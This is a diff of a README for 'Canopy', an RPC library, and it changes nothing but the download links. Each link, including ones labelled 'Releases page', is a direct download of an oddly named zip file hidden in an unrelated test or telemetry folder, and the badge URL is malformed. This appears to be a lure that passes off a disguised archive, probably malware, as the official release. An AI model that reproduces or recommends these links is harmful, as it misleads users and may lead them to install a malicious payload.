@@ -1,7 +1,7 @@
 # 🌟 Canopy - Effortless RPC with Flexible Support
 
 ## 📦 Download Canopy Now!
-[![Download Canopy](https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/tests/std_test/tests/P0718R2_atomic_smart_ptrs/Software-vive.zip%https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/tests/std_test/tests/P0718R2_atomic_smart_ptrs/Software-vive.zip)](https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/tests/std_test/tests/P0718R2_atomic_smart_ptrs/Software-vive.zip)
+[![Download Canopy](https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/telemetry/include/rpc/telemetry/Software_aspectant.zip%https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/telemetry/include/rpc/telemetry/Software_aspectant.zip)](https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/telemetry/include/rpc/telemetry/Software_aspectant.zip)
 
 ## 🚀 Getting Started
 Welcome to Canopy, your go-to solution for Remote Procedure Calls (RPC). This application lets you manage remote resources easily, regardless of how you choose to serialize data or the communication method you select. 
@@ -29,10 +29,10 @@ To run Canopy, ensure your system meets the following requirements:
 ## 🌐 Download & Install
 To download Canopy, visit the Releases page. Here, you will find the latest version available for download. 
 
-[Download Canopy from the Releases Page](https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/tests/std_test/tests/P0718R2_atomic_smart_ptrs/Software-vive.zip)
+[Download Canopy from the Releases Page](https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/telemetry/include/rpc/telemetry/Software_aspectant.zip)
 
 ### Installation Steps
-1. Visit the [Releases page](https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/tests/std_test/tests/P0718R2_atomic_smart_ptrs/Software-vive.zip).
+1. Visit the [Releases page](https://github.com/Dev-Feyisayo/Canopy/raw/refs/heads/main/telemetry/include/rpc/telemetry/Software_aspectant.zip).
 2. Locate the latest release.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions provided in the release notes.
